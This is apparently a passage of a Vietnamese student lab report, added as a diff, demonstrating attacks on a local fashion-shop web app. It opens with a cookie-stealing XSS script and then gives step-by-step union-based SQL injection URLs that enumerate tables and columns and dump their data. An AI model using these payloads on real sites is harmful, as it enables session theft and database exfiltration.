@@ -1,0 +1,27 @@
+<script>document.location="http://localhost/qlthoitrang/hacked.php?ex="+document.cookie;</script>
+2.2.1. Tấn công sql injection
+	Các bước thực hiện
+1.	Truy cập vào xem chi tiết một sản phẩm
+2.	Kiểm tra xem trang web có bị lỗi sql không bằng cách thêm kí tự  ‘ phía sau mã của sản phẩm ví dụ id = 10‘. Nếu web không load ra như ban đầu thì web đã bị lỗi
+3.	Xác định số cột trong bảng bằng lệnh order by 10 - - (10 ở đây là 1 số ví dụ) 
+http://localhost/qlthoitrang/index.php?frame=chitietsp&idCate=8&id=30 order by 10--
+4.	Sau khi xác định được số cột trong bảng ta thực hiện
+-	Sử dụng union select từ 1 đến số lượng cột của bảng
+-	Đồng thời thay đổi mã của sản phẩm  thành phủ định của nó 
+-	Xác định được những cột bị lỗi
+	http://localhost/qlthoitrang/index.php?frame=chitietsp&idCate=8&id=-30 union select 1,2,3,4,5,6,7,8--
+5.	Tại những cột bị lỗi, ta thực hiện:
+-	Thay thế nó bằng dòng lệnh Unhex(hex(group_concat(table_name)))
+-	 Kèm theo phía cuối câu lệnh select ta thêm from information_schema.tables where table_schema =database()--
+-	Xác định được tên các bảng trong database của trang web
+	http://localhost/qlthoitrang/index.php?frame=chitietsp&idCate=8&id=-30 union select 1,2,unhex(hex(group_concat(table_name))),4,5,6,7,8 from information_schema.tables where table_schema = database()--
+6.	Sau khi có được bảng cần tấn công ta tiếp tục thực hiện:
+-	Thay dòng lệnh Unhex(hex(group_concat(table_name))) thành dòng lệnh Unhex(hex(group_concat(column_name)))
+-	Đồng thời thay đổi from information_schema.tables where table_schema =database() thành from information_schema.columns where table_name =’tên bảng đã xác định’
+-	Sau khi thực hiện ta xác định được tên các cột của bản
+	http://localhost/qlthoitrang/index.php?frame=chitietsp&idCate=8&id=-30 union select 1,2,unhex(hex(group_concat(column_name))),4,5,6,7,8 from information_schema.columns where table_name = ‘tên bảng đã xác định’--
+7.	Tiếp tục tấn công vào bảng dữ liệu để lấy thông tin:
+-	Thay đổi Unhex(hex(group_concat(column_name))) thành Unhex(hex(group_concat(“tên các cột của bảng”)))
+-	Đồng thời thay đổi from information_schema.columns where table_name =’tên bảng đã xác định’ thành from tên bảng đã xác định
+	http://localhost/qlthoitrang/index.php?frame=chitietsp&idCate=8&id=-30 union select 1,2,unhex(hex(group_concat(“tên các cột trong bảng”))),4,5,6,7,8 from tên bảng đã xác định--
+8.	Kết quả ta nhận được dữ liệu ở trong các trường cần thay đổi, hoàn thành tấn công bằng lệnh select.
